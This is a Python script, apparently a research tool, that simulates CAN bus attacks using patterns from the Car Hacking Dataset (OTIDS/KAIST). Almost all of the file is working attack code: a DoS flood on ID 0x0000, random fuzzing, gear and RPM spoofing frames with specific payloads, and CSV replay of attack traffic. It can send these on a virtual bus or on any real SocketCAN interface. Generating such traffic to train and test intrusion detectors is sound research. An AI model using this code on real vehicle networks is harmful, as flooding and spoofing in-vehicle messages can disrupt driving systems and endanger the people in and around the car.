#!/usr/bin/env python3
"""Interactive CAN bus attack simulator.

Sends attack traffic to a Linux CAN interface (including vcan) based on
patterns observed in the Car Hacking Dataset (OTIDS / KAIST).

Attack types:
    - DoS:   Floods ID 0x0000 with all-zero payloads at max rate
    - Fuzzy: Random IDs and random payloads at random intervals
    - Gear:  Spoofs gear-related ID 0x043F with crafted payload
    - RPM:   Spoofs RPM-related ID 0x0316 with crafted payload
    - Manual: User-defined frames or loaded from CSV

Requires: python-can, Linux with SocketCAN support.

Usage::

    python -m scripts.can_attack_sim
    # or
    python scripts/can_attack_sim.py
"""

from __future__ import annotations

import random
import sys
import threading
import time
from pathlib import Path

try:
    import can
except ImportError:
    print("ERROR: python-can is required. Install with: pip install python-can")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Interface discovery
# ---------------------------------------------------------------------------

_VIRTUAL_SENTINEL = "__virtual__"


def discover_can_interfaces() -> list[str]:
    """Scan /sys/class/net for CAN-capable interfaces (including vcan)."""
    net_dir = Path("/sys/class/net")
    interfaces: list[str] = []
    if not net_dir.exists():
        return interfaces
    for iface in sorted(net_dir.iterdir()):
        iface_type = iface / "type"
        uevent = iface / "uevent"
        name = iface.name
        # CAN interfaces have ARPHRD_CAN (type 280) or start with vcan/can
        try:
            type_val = iface_type.read_text().strip()
            if type_val == "280":
                interfaces.append(name)
                continue
        except (OSError, ValueError):
            pass
        if name.startswith(("can", "vcan", "slcan")):
            interfaces.append(name)
    return interfaces


def choose_interface() -> str:
    """Let the user pick a CAN interface interactively.

    Returns either an interface name (e.g. ``vcan0``) or the sentinel
    ``_VIRTUAL_SENTINEL`` when the python-can virtual bus should be used.
    """
    interfaces = discover_can_interfaces()
    if not interfaces:
        print("\n  No CAN interfaces found on this machine.")
        print("  To create a virtual CAN interface run:")
        print("    sudo modprobe vcan")
        print("    sudo ip link add dev vcan0 type vcan")
        print("    sudo ip link set up vcan0")
        print("  Using python-can virtual bus (in-process simulation, no kernel module needed).\n")
        return _VIRTUAL_SENTINEL

    print("\n  Available CAN interfaces:")
    for i, iface in enumerate(interfaces, 1):
        print(f"    [{i}] {iface}")
    print()
    while True:
        choice = input(f"Select interface [1-{len(interfaces)}] or type name: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
            return interfaces[int(choice) - 1]
        if choice:
            return choice


# ---------------------------------------------------------------------------
# Attack generators
# ---------------------------------------------------------------------------

def _send_frames(bus: can.Bus, frames: list[can.Message], interval: float,
                 count: int, label: str) -> int:
    """Send frames in a loop, return number sent."""
    sent = 0
    print(f"\n  Sending {label} attack — press Ctrl+C to stop")
    print(f"  Target count: {count if count > 0 else 'infinite'},  interval: {interval*1000:.2f} ms\n")
    try:
        i = 0
        while count <= 0 or i < count:
            frame = frames[i % len(frames)]
            bus.send(frame)
            sent += 1
            i += 1
            if sent % 500 == 0:
                print(f"  [{sent} frames sent]", end="\r")
            if interval > 0:
                time.sleep(interval)
    except KeyboardInterrupt:
        pass
    print(f"\n  Done — {sent} frames sent.")
    return sent


def attack_dos(bus: can.Bus) -> None:
    """DoS attack: flood ID 0x0000, all-zero payload, max rate."""
    print("\n  === DoS Attack ===")
    print("  Pattern: ID=0x0000, DLC=8, payload=00 00 00 00 00 00 00 00")
    print("  Interval: ~0.0005 s (matching dataset timing)\n")
    count_str = input("  Number of frames to send (0 = infinite, default 5000): ").strip()
    count = int(count_str) if count_str else 5000
    frame = can.Message(arbitration_id=0x0000, data=[0]*8, is_extended_id=False)
    _send_frames(bus, [frame], 0.0005, count, "DoS")


def attack_fuzzy(bus: can.Bus) -> None:
    """Fuzzy attack: random IDs (0x000–0x7FF), random payloads."""
    print("\n  === Fuzzy Attack ===")
    print("  Pattern: random ID (0x000-0x7FF), DLC=8, random payload")
    print("  Interval: ~0.005 s (varied)\n")
    count_str = input("  Number of frames to send (0 = infinite, default 2000): ").strip()
    count = int(count_str) if count_str else 2000
    # Pre-generate a batch of random frames
    batch_size = min(count if count > 0 else 10000, 10000)
    frames = []
    for _ in range(batch_size):
        arb_id = random.randint(0x000, 0x7FF)
        data = [random.randint(0, 255) for _ in range(8)]
        frames.append(can.Message(arbitration_id=arb_id, data=data, is_extended_id=False))
    _send_frames(bus, frames, 0.005, count, "Fuzzy")


def attack_gear(bus: can.Bus) -> None:
    """Gear spoofing: inject ID 0x043F with crafted gear payload."""
    print("\n  === Gear Spoofing Attack ===")
    print("  Pattern: ID=0x043F, DLC=8, payload=01 45 60 FF 6B 00 00 00")
    print("  Interval: ~0.001 s\n")
    count_str = input("  Number of frames to send (0 = infinite, default 3000): ").strip()
    count = int(count_str) if count_str else 3000
    frame = can.Message(
        arbitration_id=0x043F,
        data=[0x01, 0x45, 0x60, 0xFF, 0x6B, 0x00, 0x00, 0x00],
        is_extended_id=False,
    )
    _send_frames(bus, [frame], 0.001, count, "Gear")


def attack_rpm(bus: can.Bus) -> None:
    """RPM spoofing: inject ID 0x0316 with crafted RPM payload."""
    print("\n  === RPM Spoofing Attack ===")
    print("  Pattern: ID=0x0316, DLC=8, payload=45 29 24 FF 29 24 00 FF")
    print("  Interval: ~0.001 s\n")
    count_str = input("  Number of frames to send (0 = infinite, default 3000): ").strip()
    count = int(count_str) if count_str else 3000
    frame = can.Message(
        arbitration_id=0x0316,
        data=[0x45, 0x29, 0x24, 0xFF, 0x29, 0x24, 0x00, 0xFF],
        is_extended_id=False,
    )
    _send_frames(bus, [frame], 0.001, count, "RPM")


# ---------------------------------------------------------------------------
# Manual mode
# ---------------------------------------------------------------------------

def manual_hand_input(bus: can.Bus) -> None:
    """Let the user type CAN frames interactively."""
    print("\n  === Manual Input Mode ===")
    print("  Enter frames as:  ID  DATA (hex bytes, space-separated)")
    print("  Example:  043F 01 45 60 FF 6B 00 00 00")
    print("  Type 'done' to finish, 'repeat N INTERVAL' to replay last frame.\n")
    last_frame: can.Message | None = None
    sent = 0
    while True:
        line = input("  > ").strip()
        if not line or line.lower() == "done":
            break
        if line.lower().startswith("repeat") and last_frame is not None:
            parts = line.split()
            try:
                n = int(parts[1]) if len(parts) > 1 else 10
                interval = float(parts[2]) if len(parts) > 2 else 0.001
            except (ValueError, IndexError):
                print("    Usage: repeat [COUNT] [INTERVAL_SEC]  (e.g. repeat 100 0.001)")
                continue
            sent += _send_frames(bus, [last_frame], interval, n, "Manual-repeat")
            continue
        if line.lower().startswith("repeat") and last_frame is None:
            print("    No previous frame to repeat. Send a frame first.")
            continue
        try:
            tokens = line.split()
            arb_id = int(tokens[0], 16)
            data = [int(b, 16) for b in tokens[1:9]]
            frame = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
            bus.send(frame)
            last_frame = frame
            sent += 1
            print(f"    Sent ID=0x{arb_id:03X} data={' '.join(f'{b:02X}' for b in data)}")
        except (ValueError, IndexError) as e:
            print(f"    Parse error: {e}")
    print(f"\n  Manual session done — {sent} frames sent.")


def manual_csv_load(bus: can.Bus) -> None:
    """Load CAN frames from a CSV file and replay them.

    Supports the Car Hacking Dataset format:
        Timestamp,ID,DLC,Data0,...,Data7,Flag
    Sends only attack rows (Flag != R) by default, or all rows if requested.
    """
    print("\n  === CSV Replay Mode ===")
    path_str = input("  Path to CSV file: ").strip()
    if not path_str:
        print("  Cancelled.")
        return
    path = Path(path_str)
    if not path.exists():
        print(f"  File not found: {path}")
        return

    filter_choice = input("  Send [a]ttack frames only, or [b]oth? (default: b): ").strip().lower()
    send_all = filter_choice != "a"

    timing_choice = input("  Use original timing? [y/n] (default: y): ").strip().lower()
    use_timing = timing_choice != "n"

    type = "attack" if not send_all else "all"
    print(f"  Send {type} frames \n")

    # Parse CSV
    frames: list[tuple[float, can.Message]] = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            parts = line.strip().split(",")
            if len(parts) < 5:
                continue
            # Skip header if present
            if parts[0].lower() == "timestamp":
                continue
            ts = parts[0]
            can_id_str = parts[1]
            flag = parts[-1].strip()

            if not send_all and flag == "R":
                continue

            try:
                ts_f = float(ts)
            except ValueError:
                continue
            try:
                if "e" in can_id_str.lower() or "+" in can_id_str:
                    arb_id = int(float(can_id_str))
                else:
                    arb_id = int(can_id_str, 16)
            except ValueError:
                continue

            data_fields = parts[3:-1]
            data = []
            for d in data_fields[:8]:
                try:
                    data.append(int(d, 16) if d else 0)
                except ValueError:
                    try:
                        data.append(int(d))
                    except ValueError:
                        data.append(0)
            data = (data + [0]*8)[:8]

            frame = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
            frames.append((ts_f, frame))

    if not frames:
        print("  No frames matched filter criteria.")
        return

    print(f"\n  Loaded {len(frames)} frames from {path.name}")
    print(f"  ID range: 0x{min(f[1].arbitration_id for f in frames):03X} - "
          f"0x{max(f[1].arbitration_id for f in frames):03X}")
    print(f"  Press Ctrl+C to stop\n")

    sent = 0
    try:
        for i, (ts, frame) in enumerate(frames):
            bus.send(frame)
            sent += 1
            if sent % 500 == 0:
                print(f"  [{sent}/{len(frames)} frames sent]", end="\r")
            if use_timing and i + 1 < len(frames):
                delay = frames[i + 1][0] - ts
                if 0 < delay < 1.0:
                    time.sleep(delay)
            elif not use_timing:
                time.sleep(0.001)
    except KeyboardInterrupt:
        pass
    print(f"\n  Done — {sent} frames sent.")


def attack_manual(bus: can.Bus) -> None:
    """Manual mode: hand-input or CSV replay."""
    print("\n  === Manual Mode ===")
    print("    [1] Type frames by hand")
    print("    [2] Load from CSV file")
    choice = input("  Select [1/2]: ").strip()
    if choice == "2":
        manual_csv_load(bus)
    else:
        manual_hand_input(bus)


def _candump_listener(bus: can.Bus, stop_event: threading.Event) -> None:
    """Print received frames in candump format (virtual bus only)."""
    while not stop_event.is_set():
        msg = bus.recv(timeout=0.1)
        if msg:
            data_hex = msg.data.hex().upper()
            print(f"  ({msg.timestamp:.6f}) vcan_sim {msg.arbitration_id:03X}#{data_hex}")


# ---------------------------------------------------------------------------
# Main menu
# ---------------------------------------------------------------------------

ATTACK_MENU = {
    "1": ("DoS Flood", attack_dos),
    "2": ("Fuzzy (Random)", attack_fuzzy),
    "3": ("Gear Spoofing", attack_gear),
    "4": ("RPM Spoofing", attack_rpm),
    "5": ("Manual / CSV Replay", attack_manual),
}


def main() -> None:
    print("=" * 56)
    print("   CAN Bus Attack Simulator")
    print("   Based on Car Hacking Dataset (OTIDS/KAIST)")
    print("=" * 56)

    iface = choose_interface()

    if iface == _VIRTUAL_SENTINEL:
        print("\n  Using: python-can virtual bus (loopback, no hardware needed)")
        print("  [candump] Frames will be printed below as they are sent.")
        try:
            bus = can.Bus(interface="virtual", channel="vcan_sim", receive_own_messages=True)
        except Exception as e:
            print(f"\n  ERROR: Could not open virtual bus: {e}")
            sys.exit(1)
        stop_event = threading.Event()
        threading.Thread(target=_candump_listener, args=(bus, stop_event), daemon=True).start()
    else:
        print(f"\n  Using interface: {iface}")
        print(f"  Tip: run 'candump {iface}' in another terminal to monitor frames.")
        stop_event = None
        try:
            bus = can.Bus(interface="socketcan", channel=iface)
        except Exception as e:
            print(f"\n  ERROR: Could not open {iface}: {e}")
            print("  Make sure the interface is up:")
            print(f"    sudo ip link set up {iface}")
            sys.exit(1)

    try:
        while True:
            print("\n  Attack Types:")
            for key, (name, _) in ATTACK_MENU.items():
                print(f"    [{key}] {name}")
            print("    [q] Quit\n")
            choice = input("  Select attack type: ").strip().lower()
            if choice == "q":
                break
            if choice in ATTACK_MENU:
                _, func = ATTACK_MENU[choice]
                func(bus)
            else:
                print("  Invalid choice.")
    except (KeyboardInterrupt, EOFError):
        print()
    finally:
        if stop_event is not None:
            stop_event.set()
        bus.shutdown()
        print("  Bus closed. Goodbye.")


if __name__ == "__main__":
    main()
